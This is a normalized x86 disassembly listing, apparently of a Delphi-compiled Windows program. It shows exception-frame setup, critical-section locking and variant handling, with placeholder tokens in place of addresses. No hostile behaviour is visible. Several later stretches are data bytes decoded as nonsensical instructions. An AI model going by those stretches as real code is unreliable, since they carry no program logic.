mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
mov eax [ eax ]
lea edx [ ebp - 0x13c ]
call sub_4031a4
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
lea eax [ ebp - 0x3c ]
push eax
push 0x2
lea edx [ ebp - 0x140 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x140 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
jmp r-xdata
inc eax
mov ecx [ rw-data ]
xor esi esi
mov [ ecx + edx * 4 ] esi
inc edx
dec eax
jne r-xdata
sub_41542c
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_415450
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035e0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4154b3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4154ba
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4155a4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_415648
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4158f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov al [ eax + ebx + 0x3 ]
mov edx eax
and dl 0x7f
mov esi edx
and esi 0xff
mov edx [ ebp + 0x8 ]
test al 0x80
setne al
cmp esi 0xa
jne r-xdata
cmp esi 0x48
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
lea eax [ edx + eax * 8 ]
call sub_4142c0
jmp r-xdata
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x8 ]
lea esi [ ecx + edx * 8 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4158f8
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc8
retn
cmp esi 0xc
jne r-xdata
cmp esi 0xc
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4044c4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047fc
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_40480c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4044c4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov [ esi + 0x4 ] eax
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] 0x4008
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx esi
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] si
lea edx [ esi + esi * 2 ]
mov ecx [ rw-data ]
mov edx [ ecx + edx * 4 + 0x4 ]
dec edx
sub edx 0x2
jb r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x10 ]
cmp [ edi ] 0x100
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
or si 0x4000
mov [ edx + eax * 8 ] si
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
dec edx
je r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi edi
lea edi [ edx + eax * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
lea esi [ edx + eax * 8 ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4044c4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047fc
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_40480c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
push 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx eax
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_41554c
sub edx 0x4
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + eax * 8 + 0xc ] ecx
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_41550c
sub_415900
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_415b9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x1 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
lea edx [ edx + ecx + 0x3 ]
call sub_40419c
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
mov esi [ ebp - 0x20 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax ]
dec al
je r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
dec al
je r-xdata
push ebp
mov eax ebx
call sub_415648
pop ecx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x48 ]
test al al
jne r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_415530
xor eax eax
push ebp
push sub_415a4b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
call sub_4142c0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_41550c
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_41550c
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ba3
lea eax [ ebp - 0x3c ]
call sub_4046b0
lea eax [ ebp - 0x38 ]
call sub_403fa4
lea eax [ ebp - 0x24 ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405328
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405328
retn
dec ebx
mov eax [ ebp - 0x8 ]
lea esi [ eax + ebx * 8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_415538
retn
mov eax [ ebp - 0x14 ]
call sub_41550c
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x48 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_41550c
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_41550c
mov eax [ ebp - 0x14 ]
call sub_41550c
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov eax [ esi ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048ac
mov edx [ ebp - 0x3c ]
mov eax [ esi + 0x4 ]
call sub_40422c
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
test al al
jne r-xdata
sub_415bdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_415c84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40504c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_415c94
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415d6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_415d4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405054
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d54
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031a4
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404208
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_4081d4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_415d84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415df3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415dfa
retn
call sub_41500c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405328
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a58
mov eax rw-data
call sub_403fa4
mov eax rw-data
call sub_40f564
sub_415dfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415e9d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ea4
retn
mov eax rw-data
call sub_4142c0
mov eax sub_40f264
mov [ rw-data ] eax
mov eax sub_40ee08
mov [ rw-data ] eax
mov edx sub_40ed18
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f564
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413ea4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f878
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412ae0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413208
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_415ea8
push 0x92004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx + 0x680000ff ] dl
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] dl
dec ecx
add [ ebp + 0x680000ff ] dl
push ss
dec ecx
add [ esi + 0x680000ff ] dl
push ss
dec ecx
add [ edi + 0x680000ff ] dl
push ss
dec ecx
add [ eax + 0x680000ff ] bl
push ss
dec ecx
add [ ecx + 0x680000ff ] bl
push ss
dec ecx
add [ edx + 0x680000ff ] bl
push ss
dec ecx
add [ ebx + 0x680000ff ] bl
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] bl
dec ecx
add [ ebp + 0x680000ff ] bl
push ss
dec ecx
add [ esi + 0x680000ff ] bl
push ss
dec ecx
add [ edi + 0x680000ff ] bl
push ss
dec ecx
add [ eax + 0x680000ff ] al
push ss
dec ecx
add [ ecx + 0x680000ff ] al
push ss
dec ecx
add [ edx + 0x680000ff ] al
push ss
dec ecx
add [ ebx + 0x680000ff ] al
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] al
dec ecx
add [ ebp + 0x680000ff ] al
push ss
dec ecx
add [ esi + 0x680000ff ] al
push ss
dec ecx
add [ edi + 0x680000ff ] al
push ss
dec ecx
add [ eax + 0x680000ff ] cl
push ss
dec ecx
add [ ecx + 0x680000ff ] cl
push ss
dec ecx
add [ edx + 0x680000ff ] cl
push ss
dec ecx
add [ ebx + 0x680000ff ] cl
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] cl
dec ecx
add [ ebp + 0x680000ff ] cl
push ss
dec ecx
add [ esi + 0x680000ff ] cl
push ss
dec ecx
add [ edi + 0x680000ff ] cl
push ss
dec ecx
add [ eax - 0x1 ] dh
add [ eax ] al
push 0x71004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x73004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] dh
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x76004916
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_415ff5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ffc
retn
sub_416039
push ss
pushad
inc ecx
add [ ebx ] ah
pushad
inc ecx
add [ 0x9004160 ] ch
pushad
inc ecx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
push 0x3f895c17
lea eax [ edx - 0x7b ]
push cs
lahf
push esp
cmc
or al 0x22
xchg ebx eax
cmp [ eax + 0x41 ] esp
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x60b80040 ] cl
inc ecx
add [ ecx + 0x60 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
inc ecx
add [ eax + eax ] dl
add [ eax ] al
test al 0xe7
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
push eax
push esp
inc ecx
add [ ebp + edx * 2 + 0x54e00041 ] ah
inc ecx
add [ edx * 2 + 0x54f40041 ] dl
inc ecx
add [ eax ] al
pop ecx
inc ecx
add ah bl
push esp
inc ecx
add [ eax + edx * 2 + 0x50bc0041 ] al
inc ecx
add [ eax + 0x51 ] cl
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ eax + 0x50 ] bh
inc ecx
add [ eax ] ch
push ebp
inc ecx
add [ eax ] dl
push ecx
inc ecx
add [ ecx + edx * 2 ] al
inc ecx
add ah ch
push ebp
inc ecx
add ah al
pop ebx
inc ecx
add al dl
pop ebx
inc ecx
add [ eax ] bl
push 0x68880041
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ edi ] dl
push esp
push eax
jne r-xdata
jb r-xdata
insb
imul esi [ ebx + 0x68 ] 0x656c6261
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
popad
outsb
je r-xdata
je r-xdata
jb r-xdata
jns r-xdata
push eax
add ecx [ ecx ]
jb r-xdata
popad
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
popad
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc eax 0x6f725045
jo r-xdata
call sub_41625c
pop edx
pop esi
outsd
jb r-xdata
pop ebx
retn
add [ edx + 0x5e ] bl
add [ eax ] al
add bh bh
jo r-xdata
in al dx
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ 0x6f725045 ] dl
jb r-xdata
pop ecx
pop edx
pop ebx
retn
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x61 ] dh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
push cs
inc ebp
push eax
inc eax
add [ esi ] cl
sar bh 0xff
jae r-xdata
outsd
jb r-xdata
dec edi
iretd
jns r-xdata
push esi
popad
jb r-xdata
bound ebp [ ecx + ebp * 2 + 0x73 ]
push 0x656c6261
int3
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
inc esp
and al 0x4
or edx [ edx + ebp * 2 ]
mov ecx [ rw-data ]
outsd
outsb
jbe r-xdata
or al 0x24
mov esi edx
mov ebx eax
mov eax ebx
call sub_40319c
mov ecx [ esp ]
mov edx esi
jb r-xdata
salc
inc ebp
sub_416210
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
pop ecx
pop edx
pop ebx
retn
sub_41623c
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_40319c
mov ecx [ esp ]
mov edx esi
call sub_41625c
pop edx
pop esi
pop ebx
retn
sub_41625c
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_403494
mov ecx [ esp ]
mov edx esi
call sub_416ab4
pop edx
pop esi
pop ebx
retn
sub_41627c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4164d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_415d7c
mov ecx [ r-xdata ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41623c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_416210
jmp r-xdata
lea eax [ esi + 0x1 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
jmp [ eax * 4 + jump_table_4162ed ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4164da
lea eax [ ebp - 0x18 ]
call sub_4046b0
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fc8
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416aec
mov edx eax
mov eax edi
mov cl 0xfc
call sub_413958
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4172e4
mov eax edi
call sub_413b50
jmp r-xdata
mov eax edi
lea edx [ esi + 0x1 ]
call sub_413bb8
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4170bc
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_413b8c
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417128
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_413c08
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417608
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4176c0
push edx
push eax
mov eax edi
call sub_413a54
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416aec
mov edx eax
mov eax [ ebx ]
mov ecx [ eax ]
mov eax edi
call sub_414988
jmp r-xdata
mov eax esi
call sub_4168b0
mov eax [ eax + 0x9 ]
mov eax [ eax ]
cmp eax [ r-xdata ]
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416bbc
mov edx [ ebp - 0xc ]
mov eax edi
call sub_413b8c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416aec
mov edx eax
mov eax edi
mov cl 0xfc
call sub_413958
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416c30
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_413b8c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416aec
mov edx eax
mov eax edi
mov cl 0xfc
call sub_413958
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416aec
mov edx eax
mov eax edi
call sub_413b28
jmp r-xdata
sub_4164e8
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
call sub_411ad0
call sub_402a30
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
